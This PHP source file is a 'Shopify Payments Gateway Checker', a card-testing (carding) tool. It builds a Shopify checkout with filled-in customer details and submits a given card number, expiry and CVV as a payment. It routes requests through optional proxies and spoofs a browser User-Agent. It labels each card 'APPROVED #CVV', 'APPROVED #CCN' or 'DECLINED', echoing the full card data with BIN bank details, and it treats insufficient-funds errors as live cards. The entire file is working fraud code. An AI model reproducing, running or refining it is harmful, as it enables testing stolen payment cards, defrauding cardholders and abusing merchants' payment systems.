<?php
/**
 * Shopify Payments Gateway Checker
 * This gateway uses the Shopify API to validate cards
 */

// Function to check card with Shopify
function checkCardWithShopify($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig = null) {
    // Shop ID should be in apiKey, Checkout Token can be in secretKey
    $shopId = $apiKey;
    $checkoutToken = $secretKey;
    
    // Check if we have the required keys
    if (empty($shopId)) {
        return "❌ SHOPIFY ERROR - Missing Shop ID";
    }
    
    try {
        // Initialize cURL session
        $ch = curl_init();
        
        // Format month and year
        $formattedMonth = str_pad($mes, 2, '0', STR_PAD_LEFT);
        $formattedYear = strlen($ano) === 2 ? "20" . $ano : $ano;
        
        // Generate a checkout token if not provided
        if (empty($checkoutToken)) {
            // Prepare checkout creation data
            $checkoutData = json_encode([
                "checkout" => [
                    "email" => $user_data['email'],
                    "shipping_address" => [
                        "first_name" => $user_data['first_name'],
                        "last_name" => $user_data['last_name'],
                        "address1" => $user_data['street'],
                        "city" => $user_data['city'],
                        "province" => $user_data['state'],
                        "zip" => $user_data['postcode'],
                        "country" => $user_data['country'],
                        "phone" => $user_data['phone']
                    ],
                    "line_items" => [
                        [
                            "quantity" => 1,
                            "price" => mt_rand(100, 500) / 100,
                            "title" => "Card Validation"
                        ]
                    ]
                ]
            ]);
            
            // Set cURL options for checkout creation
            curl_setopt($ch, CURLOPT_URL, "https://checkout.shopify.com/api/checkouts/init.json");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $checkoutData);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "Content-Type: application/json",
                "Accept: application/json",
                "X-Shopify-Shop-Id: " . $shopId,
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            ]);
            
            // Set proxy if configured
            if ($proxyConfig) {
                curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
                
                if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
                }
                
                if ($proxyConfig['type'] === 'socks5') {
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                }
            }
            
            // Execute the request
            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            // Check if the request failed
            if (curl_errno($ch)) {
                curl_close($ch);
                return "❌ SHOPIFY ERROR - Connection Error: " . curl_error($ch);
            }
            
            curl_close($ch);
            
            // Parse the response
            $result = json_decode($response, true);
            
            // Check if checkout was created successfully
            if ($httpcode === 200 && isset($result['checkout'])) {
                $checkoutToken = $result['checkout']['token'];
            } else {
                // Failed to create checkout
                $errorMessage = "Failed to create checkout";
                
                if (isset($result['errors'])) {
                    $errorMessage = is_array($result['errors']) ? implode(", ", $result['errors']) : $result['errors'];
                }
                
                // Format BIN information
                $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
                
                return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: {$errorMessage} ]{$bin_info}";
            }
        }
        
        // Now submit the payment with the checkout token
        $ch = curl_init();
        
        // Prepare payment data
        $paymentData = json_encode([
            "credit_card" => [
                "number" => $cc,
                "name" => $user_data['name'],
                "month" => $formattedMonth,
                "year" => substr($formattedYear, -2),
                "verification_value" => $cvv
            ],
            "payment_session_scope" => "checkout.shopify.com"
        ]);
        
        // Set cURL options for payment
        curl_setopt($ch, CURLOPT_URL, "https://checkout.shopify.com/x/shops/{$shopId}/checkouts/{$checkoutToken}/payment");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $paymentData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json",
            "Accept: application/json",
            "X-Shopify-Checkout-Token: " . $checkoutToken,
            "X-Shopify-Shop-Id: " . $shopId,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]);
        
        // Set proxy if configured
        if ($proxyConfig) {
            curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
            
            if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
            }
            
            if ($proxyConfig['type'] === 'socks5') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        
        // Execute the payment request
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Check if the request failed
        if (curl_errno($ch)) {
            curl_close($ch);
            // Format BIN information
            $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
            return "❌ SHOPIFY ERROR - Payment Error: " . curl_error($ch) . $bin_info;
        }
        
        curl_close($ch);
        
        // Parse the payment response
        $paymentResult = json_decode($response, true);
        
        // Format BIN information
        $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
        
        // Check payment status
        if ($httpcode === 200 && isset($paymentResult['transaction']) && isset($paymentResult['transaction']['status']) && $paymentResult['transaction']['status'] === 'success') {
            // Payment was successful
            return "✅ APPROVED #CVV - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: Payment Approved - ID: {$paymentResult['transaction']['id']} ]{$bin_info}";
        } elseif ($httpcode === 200 && isset($paymentResult['transaction']) && isset($paymentResult['transaction']['status']) && $paymentResult['transaction']['status'] === 'pending') {
            // Payment is pending
            return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: Payment Pending ]{$bin_info}";
        } elseif (isset($paymentResult['error'])) {
            // Payment error
            $errorMessage = $paymentResult['error']['message'] ?? "Unknown Error";
            
            // Check for specific error messages that indicate the card is valid but has insufficient funds
            if (strpos($errorMessage, 'fund') !== false || strpos($errorMessage, 'insufficient') !== false || strpos($errorMessage, 'balance') !== false) {
                return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: {$errorMessage} ]{$bin_info}";
            } else {
                return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: {$errorMessage} ]{$bin_info}";
            }
        } else {
            // Payment failed
            $errorMessage = "Unknown Error";
            
            if (isset($paymentResult['message'])) {
                $errorMessage = $paymentResult['message'];
            }
            
            return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SHOPIFY: {$errorMessage} ]{$bin_info}";
        }
    } catch (Exception $e) {
        return "❌ SHOPIFY ERROR - Exception: " . $e->getMessage();
    }
}
?>